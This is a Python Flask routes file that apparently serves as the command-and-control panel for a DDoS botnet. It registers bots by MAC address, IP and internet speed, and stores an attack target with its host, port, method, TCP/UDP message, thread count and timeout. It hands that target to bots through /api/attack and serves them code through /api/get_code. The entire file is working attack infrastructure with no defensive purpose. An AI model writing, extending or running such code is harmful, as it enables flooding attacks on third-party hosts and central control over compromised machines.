import time

from flask import render_template, request, jsonify, redirect, url_for

from app import app, db
from models import Attack, User, Code


@app.route('/', methods=['GET', 'POST'])
def index():
    users = User.query.all()
    last_seen_max = time.time() - 2 * 60
    data = Attack.query.first()
    if data:
        fields = ('host', 'method', 'smart', 'timeout', 'msg_tcp_udp', 'port',
                  'max_thread', 'percent')
        data = {i: getattr(data, i) for i in fields}
        return render_template('index.html', users=users,
                               last_seen_max=last_seen_max, **data)
    return render_template('index.html', users=users,
                           last_seen_max=last_seen_max)


@app.route('/start', methods=['GET', 'POST'])
def start():
    users = User.query.all()
    last_seen_max = time.time() - 2 * 60

    attack = Attack.query.all()
    for i in attack:
        db.session.delete(i)
    db.session.commit()

    if request.form.get('stop_') == '1':
        return render_template('index.html', users=users,
                               last_seen_max=last_seen_max)

    host = request.form.get('host_')
    method = request.form.get('method_')
    smart = request.form.get('smart_')
    timeout = request.form.get('timeout_', '')
    msg_tcp_udp = request.form.get('msg_tcp_udp_')
    port = request.form.get('port_')
    max_thread = request.form.get('max_thread_', '')
    percent = request.form.get('percent_', '')

    smart = smart == 'true'

    attack = Attack(host=host, method=method, timeout=timeout, smart=smart,
                    msg_tcp_udp=msg_tcp_udp, port=port, max_thread=max_thread,
                    percent=percent)
    db.session.add(attack)
    db.session.commit()
    return redirect(url_for('index'))


@app.route('/stop', methods=['GET', 'POST'])
def stop():
    users = User.query.all()
    last_seen_max = time.time() - 2 * 60
    attack = Attack.query.all()
    for i in attack:
        db.session.delete(i)
    db.session.commit()
    return render_template('index.html', users=users,
                           last_seen_max=last_seen_max)


@app.route('/api/checkin/<mac_address>/<internet_speed>',
           methods=['GET', 'POST'])
def checkin(mac_address, internet_speed):
    user = User.query.filter_by(mac=mac_address).all()
    if len(user):
        db.session.delete(user[0])
        db.session.commit()
    ip = request.remote_addr
    user = User(mac=mac_address, ip=ip, internet_speed=internet_speed,
                last_seen=time.time())
    db.session.add(user)
    db.session.commit()
    return jsonify({
        'status': True,
    })


@app.route('/api/attack', methods=['POST'])
def attack():
    try:
        attack = Attack.query.all()[-1]
        return jsonify({
            'status': True,
            'id': attack.id,
            'host': attack.host,
            'method': attack.method,
            'smart': attack.smart,
            'timeout': attack.timeout,
            'msg_tcp_udp': attack.msg_tcp_udp,
            'port': attack.port,
            'max_thread': attack.max_thread,
            'percent': attack.percent,
        })
    except IndexError:
        return jsonify({
            'status': False,
        })


@app.route('/api/get_code')
def get_code():
    code = Code.query.all()[-1]
    return jsonify({
        'code': code.code,
    })
